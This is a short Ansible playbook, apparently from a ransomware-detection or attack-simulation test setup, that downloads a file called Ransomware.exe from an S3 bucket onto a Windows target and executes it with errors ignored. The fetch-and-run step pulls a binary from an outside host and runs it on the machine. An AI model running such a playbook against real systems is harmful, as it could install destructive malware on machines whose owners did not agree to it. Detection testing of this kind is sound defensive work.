---
# ransomware detection
- hosts: "{{target}}"
  gather_facts: no
  tasks:
  - name: Download Ransomware
    win_get_url:
       url: https://product-experience-attack-platform.s3.us-east-2.amazonaws.com/Ransomware.exe
       dest: c:\Ransomware.exe
       
  - name: Execute Ransomware
    win_command: c:\Ransomware.exe
    ignore_errors: yes
    args:
      stdin: Write-Host test
